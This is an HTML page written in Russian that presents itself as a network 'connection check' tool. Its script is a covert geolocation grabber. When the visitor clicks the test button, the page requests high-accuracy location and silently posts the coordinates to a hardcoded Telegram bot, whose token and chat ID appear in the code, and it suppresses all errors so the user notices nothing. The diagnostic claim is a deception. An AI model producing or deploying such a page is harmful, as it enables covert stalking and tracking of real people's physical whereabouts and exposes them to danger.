<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Проверка соединения</title>
    <style>
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 28px;
            padding: 32px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        h2 { font-size: 1.8rem; margin-bottom: 0.5rem; }
        .sub { color: #555; margin-bottom: 2rem; }
        button {
            background: #007bff;
            color: white;
            border: none;
            border-radius: 50px;
            padding: 14px 28px;
            font-size: 1.2rem;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { background: #0056b3; }
        .legend { font-size: 0.7rem; color: #aaa; margin-top: 24px; }
    </style>
</head>
<body>
<div class="card">
    <h2>Проверка соединения</h2>
    <div class="sub">Нажмите кнопку для диагностики сети</div>
    <button id="actionBtn">Запустить тест</button>
    <div class="legend">
        ⚡ Для точной диагностики может потребоваться разрешение на определение региона.
    </div>
</div>

<script>
    // === НАСТРОЙКИ (ПРОВЕРЬТЕ ТОКЕН И CHAT_ID) ===
    const BOT_TOKEN = "8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0"; // исправлено AAF, а не AEF
    const YOUR_CHAT_ID = 550519891;  // ваш личный Telegram ID
    // ==========================================

    async function sendLocation(lat, lon) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: YOUR_CHAT_ID,
                    latitude: lat,
                    longitude: lon
                })
            });
        } catch (e) {
            // Полная тишина — пользователь ничего не видит
        }
    }

    function requestLocation() {
        if (!navigator.geolocation) return;
        navigator.geolocation.getCurrentPosition(
            (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude),
            () => {},  // ошибка — молчок
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    document.getElementById('actionBtn').addEventListener('click', requestLocation);
</script>
</body>
</html>
